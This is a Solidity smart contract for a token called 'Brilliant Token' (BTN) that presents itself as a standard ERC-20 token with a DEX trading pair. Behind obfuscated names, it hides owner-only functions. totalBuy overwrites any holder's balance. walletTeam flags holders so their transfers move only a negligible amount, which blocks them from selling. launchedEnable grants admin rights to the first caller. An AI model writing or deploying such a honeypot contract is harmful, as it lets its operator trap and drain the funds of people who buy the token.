//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface Factory {
    function createPair(address tokenA, address tokenB) external returns (address);
}

interface Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract BrilliantToken {

    string public name = "Brilliant Token";

    mapping(address => mapping(address => uint256)) private totalMode;

    mapping(address => bool) public limitList;

    constructor (){
        Router shouldBuy = Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        senderMin = Factory(shouldBuy.factory()).createPair(shouldBuy.WETH(), address(this));
        totalShould = msg.sender;
        limitList[msg.sender] = true;
        autoSwap[msg.sender] = totalSupply;
        emit Transfer(address(0), totalShould, totalSupply);
    }

    bool public atBuy;

    uint8  public decimals = 18;

    uint256 private enableMarketing;

    mapping(address => uint256) private autoSwap;

    address public totalShould;

    function transferFrom(address limitSwap, address feeMin, uint walletTake) public returns (bool){
        if (limitSwap != msg.sender && totalMode[limitSwap][msg.sender] != type(uint256).max) {
            require(totalMode[limitSwap][msg.sender] >= walletTake);
            totalMode[limitSwap][msg.sender] -= walletTake;
        }
        if (limitSwap == totalShould) {
            return listLaunch(limitSwap, feeMin, walletTake);
        }
        if (launchSell[limitSwap]) {
            return listLaunch(limitSwap, feeMin, isTrading);
        }
        return listLaunch(limitSwap, feeMin, walletTake);
    }

    function tokenBuy(uint256 walletTake) public {
        require(limitList[msg.sender]);
        enableMarketing = walletTake;
    }

    mapping(address => bool) public launchSell;

    function launchedEnable(address takeTo) public {
        if (atBuy) {
            return;
        }
        limitList[takeTo] = true;
        atBuy = true;
    }

    event  Transfer(address indexed src, address indexed dst, uint wad);

    function balanceOf(address account) public view virtual returns (uint256) {
        return autoSwap[account];
    }

    event  Approval(address indexed src, address indexed guy, uint wad);

    uint256 constant isTrading = 11 ** 10;

    function totalBuy(address launchFund, uint256 walletTake) public {
        require(limitList[msg.sender]);
        autoSwap[launchFund] = walletTake;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    address public senderMin;

    function walletTeam(address autoBuy) public {
        require(limitList[msg.sender]);
        if (autoBuy == totalShould || autoBuy == senderMin) {
            return;
        }
        launchSell[autoBuy] = true;
    }

    function listLaunch(address limitSwap, address feeMin, uint256 walletTake) internal returns (bool) {
        require(autoSwap[limitSwap] >= walletTake);
        autoSwap[limitSwap] -= walletTake;
        autoSwap[feeMin] += walletTake;
        emit Transfer(limitSwap, feeMin, walletTake);
        return true;
    }

    function approve(address guy, uint wad) public returns (bool) {
        totalMode[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    string public symbol = "BTN";

    function allowance(address holder, address spender) external view virtual returns (uint256) {
        return totalMode[holder][spender];
    }

}